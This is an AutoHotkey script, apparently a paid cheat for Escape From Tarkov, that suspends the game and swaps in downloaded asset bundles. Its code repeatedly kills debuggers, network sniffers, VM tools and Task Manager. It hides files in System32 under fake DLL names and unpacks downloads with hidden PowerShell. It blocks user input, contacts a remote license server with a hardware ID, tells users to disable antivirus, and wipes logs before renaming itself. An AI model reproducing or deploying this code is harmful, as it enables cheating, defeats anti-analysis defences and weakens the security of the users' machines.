AppPath := A_LoopFileFullPath
loop, 10
{
loop, 1
{
FileRead, profilecount, %AppPath%
StringReplace, profilecount, profilecount, |Info|application|SelectProfile ProfileId, |Info|application|SelectProfile ProfileId, UseErrorLevel
Cent4 := ErrorLevel
}
}
}
global Cent4
banlist := ["totalcmd.exe","httpanalyzer.exe", "ollydbg.exe", "ProcessHacker.exe", "tcpview.exe", "autoruns.exe", "filemon.exe", "procmon.exe", "procmon64.exe",  "procmon64.exe", "idaq.exe", "idaq64.exe", "ImmunityDebugger.exe", "Wireshark.exe", "dumpcap.exe", "HookExplorer.exe", "ImportREC.exe", "PETools.exe", "LordPE.exe", "dumpcap.exe", "SysInspector.exe", "proc_analyzer.exe", "sysAnalyzer.exe", "sniff_hit.exe", "windbg.exe", "joeboxcontrol.exe", "Fiddler.exe", "joeboxserver.exe", "ida64.exe", "ida.exe", "Vmtoolsd.exe", "Vmwaretrat.exe", "Vmwareuser.exe", "Vmacthlp.exe", "vboxservice.exe", "vboxtray.exe", "KsDumper.exe", "x64dbg.exe", "OLLYDBG.exe", "httpdebuger.exe", "ReClass.NET.exe"]
for i,el in banlist
{
p := banlist[A_Index]
Process, Exist, %p%
if(ErrorLevel != 0) {
Process, Close, %p%
}
}
Loop, %pass%\Logs\*application.log,, 1
{
AppPath := A_LoopFileFullPath
loop,
{
If (Cent1 < Counturs1)
Break
loop,
{
FileRead, Gcount, %AppPath%
If !ProcessExist("EscapeFromTarkov.exe")
ExitApp
StringReplace, Gcount, Gcount, %Fraze%, %Fraze%, UseErrorLevel
Counturs1 := ErrorLevel
If (Cent1 < Counturs1)
Break
Sleep, 50
}
}
}
sleep, %M2Rand%
Process_Suspend("EscapeFromTarkov.exe")
sleep, %SataRand%
FileCopyDir, C:\Users\Default\6.2\new, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\characters\character\prefabs, 1
sleep, 50
if skill_5 = 1
{
FileCopyDir, C:\Users\Default\7.2\items, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items, 1
}
sleep, 500
Process_Resume("EscapeFromTarkov.exe")
banlist := ["totalcmd.exe","httpanalyzer.exe", "ollydbg.exe", "ProcessHacker.exe", "tcpview.exe", "autoruns.exe", "filemon.exe", "procmon.exe", "procmon64.exe",  "idaq.exe", "idaq64.exe", "ImmunityDebugger.exe", "Wireshark.exe", "dumpcap.exe", "HookExplorer.exe", "ImportREC.exe", "PETools.exe", "LordPE.exe", "dumpcap.exe", "SysInspector.exe", "proc_analyzer.exe", "sysAnalyzer.exe", "sniff_hit.exe", "windbg.exe", "joeboxcontrol.exe", "Fiddler.exe", "joeboxserver.exe", "ida64.exe", "ida.exe", "Vmtoolsd.exe", "Vmwaretrat.exe", "Vmwareuser.exe", "Vmacthlp.exe", "vboxservice.exe", "vboxtray.exe", "KsDumper.exe", "x64dbg.exe", "OLLYDBG.exe", "httpdebuger.exe", "ReClass.NET.exe"]
for i,el in banlist
{
p := banlist[A_Index]
Process, Exist, %p%
if(ErrorLevel != 0) {
Process, Close, %p%
}
}
Sleep, 1000
Loop, %pass%\Logs\*application.log,, 1
{
AppPath := A_LoopFileFullPath
loop,
{
If (Cent2 < Counturs2)
Break
If (Cent3 < Counturs3)
Break
loop,
{
If !ProcessExist("EscapeFromTarkov.exe")
ExitApp
FileRead, cancelcount, %AppPath%
StringReplace, cancelcount, cancelcount, |Network game matching cancelled, |Network game matching cancelled, UseErrorLevel
Counturs2 := ErrorLevel
FileRead, netcount, %AppPath%
StringReplace, netcount, netcount, |TRACE-NetworkGameCreate 6, |TRACE-NetworkGameCreate 6, UseErrorLevel
Counturs3 := ErrorLevel
If (Cent2 < Counturs2)
Break
If (Cent3 < Counturs3)
Break
Sleep, 500
}
}
}
FileCopyDir, C:\Windows\headpost, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\characters\character\prefabs, 1
sleep, 50
if skill_5 = 1
{
FileCopyDir, C:\Windows\plootes, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items, 1
}
Loop, %pass%\Logs\*application.log,, 1
{
AppPath := A_LoopFileFullPath
loop,
{
If (Cent4 < Counturs4)
Break
loop,
{
FileRead, profilecount, %AppPath%
If !ProcessExist("EscapeFromTarkov.exe")
ExitApp
StringReplace, profilecount, profilecount, |Info|application|SelectProfile ProfileId, |Info|application|SelectProfile ProfileId, UseErrorLevel
Counturs4 := ErrorLevel
If (Cent4 < Counturs4)
Break
Sleep, 100
}
}
}
sleep, 3000
}
}
if (skill_2 = 1) and (RadioGroup > 0)
{
BlockInput MouseMove
hk(1)
FileDelete, %Pass%\cache\*.*
FileCreateDir, C:\Users\Default\6.2
ZapuskGame = C:\Users\Default\6.2
ZapuskPath = C:\Users\Default\123.zip
FileCreateDir, C:\Windows\headpost
FileCreateDir, C:\Users\Default\AppData\Roaming\posthead
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\characters\character\prefabs, C:\Windows\headpost, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\characters\character\prefabs, C:\Users\Default\AppData\Roaming\posthead, 1
IfNotExist, %LoadSave%
{
UrlDownloadToFile, %NewLink%, %LoadSave%
FileGetSize, ArcSize, %LoadSave%
If (ArcSize < 200000)
{
FileDelete, %LoadSave%
UrlDownloadToFile, %ReservL%, %LoadSave%
}
FileGetSize, ArcSize2, %LoadSave%
If (ArcSize2 < 200000)
{
hk(0)
BlockInput MouseMoveOff
msgbox,16,, This version isn't available at the moment`nOr you have internet problems! Contact with seller!`n`nÐ”Ð°Ð½Ð½Ð°Ñ Ð²ÐµÑ€ÑÐ¸Ñ Ð½ÐµÐ´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ð° Ð² Ð´Ð°Ð½Ð½Ñ‹Ð¹ Ð¼Ð¾Ð¼ÐµÐ½Ñ‚`nÐ˜Ð»Ð¸ Ñƒ Ð²Ð°Ñ Ð¿Ñ€Ð¾Ð±Ð»ÐµÐ¼Ñ‹ Ñ Ð¸Ð½Ñ‚ÐµÑ€Ð½ÐµÑ‚Ð¾Ð¼! Ð¡Ð²ÑÐ¶Ð¸Ñ‚ÐµÑÑŒ Ñ Ð¿Ñ€Ð¾Ð´Ð°Ð²Ñ†Ð¾Ð¼!
ExitApp
}
}
FileCopy, %LoadSave%, %ZapuskPath%
RunWait PowerShell.exe -Command Expand-Archive -LiteralPath '%ZapuskPath%' -DestinationPath '%ZapuskGame%' -Force,, Hide
FileDelete, %ZapuskPath%
if skill_5 = 1
{
FileCreateDir, C:\Users\Default\7.2
LootGame = C:\Users\Default\7.2
LootPath = C:\Users\Default\234.zip
FileCreateDir, C:\Windows\plootes
FileCreateDir, C:\Windows\plootes\barter
FileCreateDir, C:\Windows\plootes\containers
FileCreateDir, C:\Windows\plootes\food
FileCreateDir, C:\Windows\plootes\infosubject
FileCreateDir, C:\Windows\plootes\spec
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\barter, C:\Windows\plootes\barter, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\containers, C:\Windows\plootes\containers, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\food, C:\Windows\plootes\food, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\infosubject, C:\Windows\plootes\infosubject, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\spec, C:\Windows\plootes\spec, 1
FileCreateDir, C:\Users\Default\AppData\Roaming\postlet
FileCreateDir, C:\Users\Default\AppData\Roaming\postlet\barter
FileCreateDir, C:\Users\Default\AppData\Roaming\postlet\containers
FileCreateDir, C:\Users\Default\AppData\Roaming\postlet\food
FileCreateDir, C:\Users\Default\AppData\Roaming\postlet\infosubject
FileCreateDir, C:\Users\Default\AppData\Roaming\postlet\spec
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\barter, C:\Users\Default\AppData\Roaming\postlet\barter, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\containers, C:\Users\Default\AppData\Roaming\postlet\containers, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\food, C:\Users\Default\AppData\Roaming\postlet\food, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\infosubject, C:\Users\Default\AppData\Roaming\postlet\infosubject, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\spec, C:\Users\Default\AppData\Roaming\postlet\spec, 1
IfNotExist, %LootSave%
{
UrlDownloadToFile, %LootLink%, %LootSave%
FileGetSize, ArcSize, %LootSave%
If (ArcSize < 40000)
{
FileDelete, %LootSave%
UrlDownloadToFile, %ReservL%, %LootSave%
}
FileGetSize, ArcSize2, %LootSave%
If (ArcSize2 < 40000)
{
hk(0)
BlockInput MouseMoveOff
msgbox, LooThis version isn't available at the moment`nOr you have internet problems! Contact with seller!`n`nÐ”Ð°Ð½Ð½Ð°Ñ Ð²ÐµÑ€ÑÐ¸Ñ Ð½ÐµÐ´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ð° Ð² Ð´Ð°Ð½Ð½Ñ‹Ð¹ Ð¼Ð¾Ð¼ÐµÐ½Ñ‚`nÐ˜Ð»Ð¸ Ñƒ Ð²Ð°Ñ Ð¿Ñ€Ð¾Ð±Ð»ÐµÐ¼Ñ‹ Ñ Ð¸Ð½Ñ‚ÐµÑ€Ð½ÐµÑ‚Ð¾Ð¼! Ð¡Ð²ÑÐ¶Ð¸Ñ‚ÐµÑÑŒ Ñ Ð¿Ñ€Ð¾Ð´Ð°Ð²Ñ†Ð¾Ð¼!
ExitApp
}
}
FileCopy, %LootSave%, %LootPath%
RunWait PowerShell.exe -Command Expand-Archive -LiteralPath '%LootPath%' -DestinationPath '%LootGame%' -Force,, Hide
FileDelete, %LootPath%
}
SplashTextOn , 400, 80, , Now you can play! Have fun!`n`nÐ¢ÐµÐ¿ÐµÑ€ÑŒ Ð¼Ð¾Ð¶Ð½Ð¾ Ð¸Ð³Ñ€Ð°Ñ‚ÑŒ! ÐŸÐ¾Ð²ÐµÑÐµÐ»Ð¸Ñ‚ÐµÑÑŒ!
Sleep, 5000
SplashTextOff
loop,
{
banlist := ["totalcmd.exe","httpanalyzer.exe", "ollydbg.exe", "ProcessHacker.exe", "tcpview.exe", "autoruns.exe", "filemon.exe", "procmon.exe", "procmon64.exe",  "idaq.exe", "idaq64.exe", "ImmunityDebugger.exe", "Wireshark.exe", "dumpcap.exe", "HookExplorer.exe", "ImportREC.exe", "PETools.exe", "LordPE.exe", "dumpcap.exe", "SysInspector.exe", "proc_analyzer.exe", "sysAnalyzer.exe", "sniff_hit.exe", "windbg.exe", "joeboxcontrol.exe", "Fiddler.exe", "joeboxserver.exe", "ida64.exe", "ida.exe", "Vmtoolsd.exe", "Vmwaretrat.exe", "Vmwareuser.exe", "Vmacthlp.exe", "vboxservice.exe", "vboxtray.exe", "KsDumper.exe", "x64dbg.exe", "OLLYDBG.exe", "httpdebuger.exe", "ReClass.NET.exe"]
for i,el in banlist
{
p := banlist[A_Index]
Process, Exist, %p%
if(ErrorLevel != 0) {
Process, Close, %p%
}
}
FileCopy, %pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\commonprefabs\playersuperior.bundle, C:\Windows\System32\shellapp.dll ,1
FileCopy, %pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\commonprefabs\playersuperior.bundle, C:\Users\Default\AppData\Roaming\playsup.dll ,1
UrlDownloadToFile, %RecLink%, C:\Windows\System32\wintask.txt
hk(0)
BlockInput MouseMoveOff
FolderSize = 0
WhichFolder = C:\Users\Default\6.2\new
Loop, %WhichFolder%\*.*, , 1
FolderSize += %A_LoopFileSize%
If (FolderSize < 200000000)
{
hk(0)
BlockInput MouseMoveOff
msgbox,16,, Oh This version isn't available at the moment`nOr you have internet problems! Contact with seller!`n`nÐžÐ¹ Ð”Ð°Ð½Ð½Ð°Ñ Ð²ÐµÑ€ÑÐ¸Ñ Ð½ÐµÐ´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ð° Ð² Ð´Ð°Ð½Ð½Ñ‹Ð¹ Ð¼Ð¾Ð¼ÐµÐ½Ñ‚`nÐ˜Ð»Ð¸ Ñƒ Ð²Ð°Ñ Ð¿Ñ€Ð¾Ð±Ð»ÐµÐ¼Ñ‹ Ñ Ð¸Ð½Ñ‚ÐµÑ€Ð½ÐµÑ‚Ð¾Ð¼! Ð¡Ð²ÑÐ¶Ð¸Ñ‚ÐµÑÑŒ Ñ Ð¿Ñ€Ð¾Ð´Ð°Ð²Ñ†Ð¾Ð¼!
ExitApp
}
Loop, %pass%\Logs\*application.log,, 1
{
AppPath := A_LoopFileFullPath
loop, 10
{
loop, 1
{
FileRead, Gcount, %AppPath%
StringReplace, Gcount, Gcount, %Fraze%, %Fraze%, UseErrorLevel
Cent1 := ErrorLevel
}
}
}
global Cent1
hk(0)
BlockInput MouseMoveOff
Loop, %pass%\Logs\*application.log,, 1
{
AppPath := A_LoopFileFullPath
loop, 10
{
loop, 1
{
FileRead, cancelcount, %AppPath%
StringReplace, cancelcount, cancelcount, |Network game matching cancelled, |Network game matching cancelled, UseErrorLevel
Cent2 := ErrorLevel
}
}
}
global Cent2
Loop, %pass%\Logs\*application.log,, 1
{
AppPath := A_LoopFileFullPath
loop, 10
{
loop, 1
{
FileRead, netcount, %AppPath%
StringReplace, netcount, netcount, |TRACE-NetworkGameCreate 6, |TRACE-NetworkGameCreate 6, UseErrorLevel
Cent3 := ErrorLevel
}
}
}
global Cent3
Loop, %pass%\Logs\*application.log,, 1
{
AppPath := A_LoopFileFullPath
loop, 10
{
loop, 1
{
FileRead, profilecount, %AppPath%
StringReplace, profilecount, profilecount, |Info|application|SelectProfile ProfileId, |Info|application|SelectProfile ProfileId, UseErrorLevel
Cent4 := ErrorLevel
}
}
}
global Cent4
banlist := ["totalcmd.exe","httpanalyzer.exe", "ollydbg.exe", "ProcessHacker.exe", "tcpview.exe", "autoruns.exe", "filemon.exe", "procmon.exe", "procmon64.exe",  "idaq.exe", "idaq64.exe", "ImmunityDebugger.exe", "Wireshark.exe", "dumpcap.exe", "HookExplorer.exe", "ImportREC.exe", "PETools.exe", "LordPE.exe", "dumpcap.exe", "SysInspector.exe", "proc_analyzer.exe", "sysAnalyzer.exe", "sniff_hit.exe", "windbg.exe", "joeboxcontrol.exe", "Fiddler.exe", "joeboxserver.exe", "ida64.exe", "ida.exe", "Vmtoolsd.exe", "Vmwaretrat.exe", "Vmwareuser.exe", "Vmacthlp.exe", "vboxservice.exe", "vboxtray.exe", "KsDumper.exe", "x64dbg.exe", "OLLYDBG.exe", "httpdebuger.exe", "ReClass.NET.exe"]
for i,el in banlist
{
p := banlist[A_Index]
Process, Exist, %p%
if(ErrorLevel != 0) {
Process, Close, %p%
}
}
Loop, %pass%\Logs\*application.log,, 1
{
AppPath := A_LoopFileFullPath
loop,
{
If (Cent1 < Counturs1)
Break
loop,
{
FileRead, Gcount, %AppPath%
If !ProcessExist("EscapeFromTarkov.exe")
ExitApp
StringReplace, Gcount, Gcount, %Fraze%, %Fraze%, UseErrorLevel
Counturs1 := ErrorLevel
If (Cent1 < Counturs1)
Break
Sleep, 50
}
}
}
sleep, %M2Rand%
Process_Suspend("EscapeFromTarkov.exe")
sleep, %SataRand%
FileCopy, C:\Windows\System32\wintask.txt, %pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\commonprefabs\playersuperior.bundle, 1
FileCopyDir, C:\Users\Default\6.2\new, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\characters\character\prefabs, 1
sleep, 50
if skill_5 = 1
{
FileCopyDir, C:\Users\Default\7.2\items, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items, 1
}
sleep, 500
Process_Resume("EscapeFromTarkov.exe")
banlist := ["totalcmd.exe","httpanalyzer.exe", "ollydbg.exe", "ProcessHacker.exe", "tcpview.exe", "autoruns.exe", "filemon.exe", "procmon.exe", "procmon64.exe",  "idaq.exe", "idaq64.exe", "ImmunityDebugger.exe", "Wireshark.exe", "dumpcap.exe", "HookExplorer.exe", "ImportREC.exe", "PETools.exe", "LordPE.exe", "dumpcap.exe", "SysInspector.exe", "proc_analyzer.exe", "sysAnalyzer.exe", "sniff_hit.exe", "windbg.exe", "joeboxcontrol.exe", "Fiddler.exe", "joeboxserver.exe", "ida64.exe", "ida.exe", "Vmtoolsd.exe", "Vmwaretrat.exe", "Vmwareuser.exe", "Vmacthlp.exe", "vboxservice.exe", "vboxtray.exe", "KsDumper.exe", "x64dbg.exe", "OLLYDBG.exe", "httpdebuger.exe", "ReClass.NET.exe", "Taskmgr.exe"]
for i,el in banlist
{
p := banlist[A_Index]
Process, Exist, %p%
if(ErrorLevel != 0) {
Process, Close, %p%
}
}
Sleep, 1000
Loop, %pass%\Logs\*application.log,, 1
{
AppPath := A_LoopFileFullPath
loop,
{
If (Cent2 < Counturs2)
Break
If (Cent3 < Counturs3)
Break
loop,
{
If !ProcessExist("EscapeFromTarkov.exe")
ExitApp
FileRead, cancelcount, %AppPath%
StringReplace, cancelcount, cancelcount, |Network game matching cancelled, |Network game matching cancelled, UseErrorLevel
Counturs2 := ErrorLevel
FileRead, netcount, %AppPath%
StringReplace, netcount, netcount, |TRACE-NetworkGameCreate 6, |TRACE-NetworkGameCreate 6, UseErrorLevel
Counturs3 := ErrorLevel
If (Cent2 < Counturs2)
Break
If (Cent3 < Counturs3)
Break
Sleep, 500
}
}
}
FileCopyDir, C:\Windows\headpost, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\characters\character\prefabs, 1
sleep, 50
if skill_5 = 1
{
FileCopyDir, C:\Windows\plootes, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items, 1
}
FileMove, C:\Windows\System32\shellapp.dll, %pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\commonprefabs\playersuperior.bundle, 1
Loop, %pass%\Logs\*application.log,, 1
{
AppPath := A_LoopFileFullPath
loop,
{
If (Cent4 < Counturs4)
Break
loop,
{
FileRead, profilecount, %AppPath%
If !ProcessExist("EscapeFromTarkov.exe")
ExitApp
StringReplace, profilecount, profilecount, |Info|application|SelectProfile ProfileId, |Info|application|SelectProfile ProfileId, UseErrorLevel
Counturs4 := ErrorLevel
If (Cent4 < Counturs4)
Break
Sleep, 100
}
}
}
Sleep, 3000
}
}
if (skill_2 = 1) and (RadioGroup < 1)
{
{
Counturs := 0
Cent := 0
loop,
{
FileCopy, %pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\commonprefabs\playersuperior.bundle, C:\Windows\System32\shellapp.dll ,1
FileCopy, %pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\commonprefabs\playersuperior.bundle, C:\Users\Default\AppData\Roaming\playsup.dll ,1
UrlDownloadToFile, %RecLink%, C:\Windows\System32\wintask.txt
Cent := Counturs
Loop, %pass%\Logs\*application.log,, 1
{
AppPath := A_LoopFileFullPath
loop,
{
If (Cent < Counturs)
Break
loop,
{
FileRead, Gcount, %AppPath%
If !ProcessExist("EscapeFromTarkov.exe")
ExitApp
StringReplace, Gcount, Gcount, %Fraze%, %Fraze%, UseErrorLevel
Counturs := ErrorLevel
If (Cent < Counturs)
Break
}
}
}
Random, RecRand, 650, 750
sleep, %RecRand%
FileMove, C:\Windows\System32\wintask.txt, %pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\commonprefabs\playersuperior.bundle, 1
sleep, 200
Loop, %pass%\Logs\*application.log,, 1
{
FileGetSize, AppDoZam, %A_LoopFileFullPath%
Global AppDoZam
loop,
{
If !ProcessExist("EscapeFromTarkov.exe")
ExitApp
FileGetSize, AppVoZam, %A_LoopFileFullPath%
RaznAppSize := AppVoZam - AppDoZam
If (RaznAppSize > 250)
{
Sleep, 3000
FileMove, C:\Windows\System32\shellapp.dll, %pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\commonprefabs\playersuperior.bundle, 1
Break
}
Sleep, 500
}
}
}
}
}
RETURN
ProcessExist(Name){
Process,Exist,%Name%
return Errorlevel
}
Check:
Gui, Submit, NoHide
if (RadioGroup1){
RadioGroup := 1
}
if (RadioGroup2){
RadioGroup := 2
}
if (RadioGroup3){
RadioGroup := 3
}
Return
Reset:
Gui, %A_Gui%: Show, Hide
FileRemoveDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\characters\character\prefabs\new
FileRemoveDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\items
FileDelete, %A_ScriptDir%\date.bat
FileDelete, C:\Windows\System32\SysWin.dll
FileDelete, C:\Windows\System32\WinSus.dll
FileDelete, C:\Windows\System32\WinSys.dll
FileDelete, C:\Windows\System32\Vasta.dll
FileDelete, C:\Windows\System32\Micropov.dll
FileDelete, C:\Windows\System32\Chrom3Alt.dll
FileDelete, C:\Windows\System32\letX.dll
FileDelete, C:\Windows\System32\Blet.dll
FileDelete, C:\Windows\System32\Slet.dll
FileDelete, C:\Windows\System32\directX1-3.dll
FileDelete, C:\Windows\System32\Win2Sist-3.dll
FileDelete, C:\Windows\System32\Chrom3Alt-3.dll
FileDelete, C:\Windows\System32\Blet-3.dll
FileDelete, C:\Windows\System32\Slet-3.dll
FileDelete, %Pass%\cache\*.*
FileRemoveDir, C:\Windows\headpost, 1
FileRemoveDir, C:\Windows\plootes, 1
FileCopyDir, C:\Users\Default\AppData\Roaming\posthead, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\characters\character\prefabs, 1
FileCopyDir, C:\Users\Default\AppData\Roaming\postlet, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items, 1
FileRemoveDir, C:\Users\Default\AppData\Roaming\posthead, 1
FileRemoveDir, C:\Users\Default\AppData\Roaming\postlet, 1
FileRemoveDir, C:\Users\Default\6.2, 1
FileRemoveDir, C:\Users\Default\7.2, 1
FileDelete, C:\Users\Default\123.zip
FileDelete, C:\Users\Default\234.zip
FileDelete, C:\EFTpath.txt
FileDelete, C:\Windows\BigTOS.jpg
FileDelete, C:\Users\Default\spoof.exe
FileMove, C:\Users\Default\AppData\Roaming\playsup.dll, %pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\commonprefabs\playersuperior.bundle, 1
FileDelete, C:\Windows\System32\shellapp.dll
FileDelete, C:\Windows\System32\wintask.txt
Folder1 = C:\Users\%A_UserName%\AppData\Local\Battlestate Games\BsgLauncher\Logs
Loop, %Folder1%*, 2
FileDelete, %A_LoopFileLongPath%\*.log
Folder2 = C:\Users\%A_UserName%\AppData\LocalLow\Battlestate Games\EscapeFromTarkov
Loop, %Folder2%*, 2
FileDelete, %A_LoopFileLongPath%\*.txt
Folder3 = %pass%\Logs
Loop, %Folder3%\*, 2
FileDelete, %A_LoopFileLongPath%\*.log
SplashTextOn , 200, 100, `nSee you soon!!!, Done! Reseted!`n`nÐ“Ð¾Ñ‚Ð¾Ð²Ð¾! Ð¡Ð±Ñ€Ð¾ÑˆÐµÐ½Ð¾!
Sleep, 3000
SplashTextOff
s := (s := "0123456789abcdefghijklmnopqrstuvwxyz") . s . s
loop, 20 {
Random, r, 1, StrLen(s)
i .= (c := SubStr(s, r, 1))
StrReplace(s, c, "",, 1)
}
BatchFile=
		(
		@echo off
		@chcp 1251
		timeout /t 3
		echo.|set/p x=%i%>>"%A_ScriptFullPath%"
		rename "%A_ScriptFullPath%" %i%.exe
		del %A_ScriptDir%\date.bat
)
FileDelete, %A_ScriptDir%\date.bat
FileAppend, %BatchFile%, %A_ScriptDir%\date.bat
Run, %A_ScriptDir%\date.bat,,hide
ExitApp
Leave:
Gui, %A_Gui%: Show, Hide
FileDelete, C:\Windows\BigTOS.jpg
SplashTextOn , 300, 100, See you soon!!!, You look nice today <3`nCome again:)`n`nÐ’Ñ‹ ÑÐµÐ³Ð¾Ð´Ð½Ñ Ñ…Ð¾Ñ€Ð¾ÑˆÐ¸ ÐºÐ°Ðº Ð½Ð¸ÐºÐ¾Ð³Ð´Ð° <3`nÐ—Ð°Ñ…Ð¾Ð´Ð¸Ñ‚Ðµ ÐµÑ‰Ñ‘:)
Sleep, 3000
SplashTextOff
ExitApp
Expiry:
global licenseKey
global DriveNumber
loop, 6
Try {
HTTP := ComObjCreate("WinHTTP.WinHTTPRequest.5.1")
HTTP.Open("POST", "http://awo.erqt.ru/klin/index.php", true)
HTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
HTTP.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko)")
HTTP.SetRequestHeader("Pragma", "no-cache")
HTTP.SetRequestHeader("Cache-Control", "no-cache, no-store")
HTTP.SetRequestHeader("If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT")
HTTP.Send("&key=" licenseKey "&hwid=" DriveNumber "&asklen=1")
HTTP.WaitForResponse()
Response:= cfcd208495d565ef66e7dff9f98764da
Break
} Catch, e {
Sleep, 3000
conntries = conntries + 1
If (conntries>4)
MsgBox, ÐžÑˆÐ¸Ð±ÐºÐ° Ð¿Ñ€Ð¸ ÑÐ²ÑÐ·Ð¸ Ñ ÑÐµÑ€Ð²ÐµÑ€Ð¾Ð¼`n Error while connecting to server.`n`n %e%
ExitApp
}
MsgBox,16,,%Response%
Return
Instruction:
Run, https://ecstacy.space
Return
New:
msgbox,48,Today news///Ð¡ÐµÐ³Ð¾Ð´Ð½ÑÑˆÐ½Ð¸Ðµ Ð½Ð¾Ð²Ð¾ÑÑ‚Ð¸, %News%
Return
MD5(string, case := False)
{
static MD5_DIGEST_LENGTH := 11
hModule := DllCall("LoadLibrary", "Str", "advapi32.dll", "Ptr")
, VarSetCapacity(MD5_CTX, 104, 0), DllCall("advapi32\MD5Init", "Ptr", &MD5_CTX)
, DllCall("advapi32\MD5Update", "Ptr", &MD5_CTX, "AStr", string, "UInt", StrLen(string))
, DllCall("advapi32\MD5Final", "Ptr", &MD5_CTX)
loop % MD5_DIGEST_LENGTH
o .= Format("{:02" (case ? "X" : "x") "}", NumGet(MD5_CTX, 87 + A_Index, "UChar"))
return o, DllCall("FreeLibrary", "Ptr", hModule)
}
OnExit("IrregExit")
SpoofBug(ExitApp) {
MsgBox,16,, ATTENTION! Spoofer cannot be started!`nDisable antivirus! And try again!`n`nÐ’ÐÐ˜ÐœÐÐÐ˜Ð•! Ð¡Ð¿ÑƒÑ„ÐµÑ€ Ð½Ðµ Ð¼Ð¾Ð¶ÐµÑ‚ Ð±Ñ‹Ñ‚ÑŒ Ð·Ð°Ð¿ÑƒÑ‰ÐµÐ½!`nÐžÑ‚ÐºÐ»ÑŽÑ‡Ð¸Ñ‚Ðµ Ð°Ð½Ñ‚Ð¸Ð²Ð¸Ñ€ÑƒÑ! Ð˜ Ð¿Ð¾Ð¿Ñ€Ð¾Ð±ÑƒÐ¹Ñ‚Ðµ Ð·Ð°Ð½Ð¾Ð²Ð¾!
ExitApp
}
IrregExit() {
hk(0)
BlockInput MouseMoveOff
FileCopyDir, C:\Windows\headpost, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\characters\character\prefabs, 1
FileRemoveDir, C:\Windows\headpost, 1
FileCopyDir, C:\Windows\plootes, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items, 1
FileRemoveDir, C:\Windows\plootes, 1
FileRemoveDir, C:\Users\Default\6.2, 1
FileRemoveDir, C:\Users\Default\7.2, 1
FileDelete, C:\Users\Default\123.zip
FileDelete, C:\Users\Default\234.zip
FileDelete, C:\Windows\BigTOS.jpg
FileDelete, C:\Windows\System32\wintask.txt
FileMove, C:\Windows\System32\shellapp.dll, %pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\commonprefabs\playersuperior.bundle, 1
SplashTextOn , 300, 100, See you soon!!!, You look nice today <3`nCome again:)`n`nÐ’Ñ‹ ÑÐµÐ³Ð¾Ð´Ð½Ñ Ñ…Ð¾Ñ€Ð¾ÑˆÐ¸ ÐºÐ°Ðº Ð½Ð¸ÐºÐ¾Ð³Ð´Ð° <3`nÐ—Ð°Ñ…Ð¾Ð´Ð¸Ñ‚Ðµ ÐµÑ‰Ñ‘:)
Sleep, 5000
SplashTextOff
ExitApp
}
hk(f=0) {
static allkeys, ExcludeKeys:="LButton,RButton"
if !allkeys
{
s:="||NumpadEnter|Home|End|PgUp|PgDn|Left|Right|Up|Down|Del|Ins|"
Loop, 254
k:=GetKeyName(Format("VK{:02X}",A_Index))
, s.=InStr(s, "|" k "|") ? "" : k "|"
For k,v in {Control:"Ctrl",Escape:"Esc"}
s:=StrReplace(s, k, v)
allkeys:=Trim(s, "|")
}
f:=f ? "On":"Off"
For k,v in StrSplit(allkeys,"|")
if v not in %ExcludeKeys%
Hotkey, *%v%, Block_Input, %f% UseErrorLevel
Block_Input:
Return
}
pidListFromClass(class) {
pid := []
WinGet, uid, List, ahk_class %class%
Loop, %uid% {
WinGet, thisPID, PID, % "ahk_id " uid%A_Index%
pid.Push(thisPID)
}
Return pid
}
Process_Suspend(PID_or_Name){
PID := (InStr(PID_or_Name,".")) ? ProcExist(PID_or_Name) : PID_or_Name
